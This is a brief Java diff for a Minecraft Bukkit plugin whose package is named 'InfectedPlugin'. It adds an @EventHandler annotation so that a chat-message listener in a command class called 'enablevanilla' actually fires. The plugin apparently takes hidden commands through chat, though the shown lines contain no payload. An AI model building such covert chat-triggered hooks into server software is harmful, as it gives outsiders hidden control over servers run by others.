@@ -5,11 +5,12 @@ import java.io.File;
 import org.CreeperCoders.InfectedPlugin.IP_Util;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
+import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_enablevanilla implements Listener
 {
+    @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
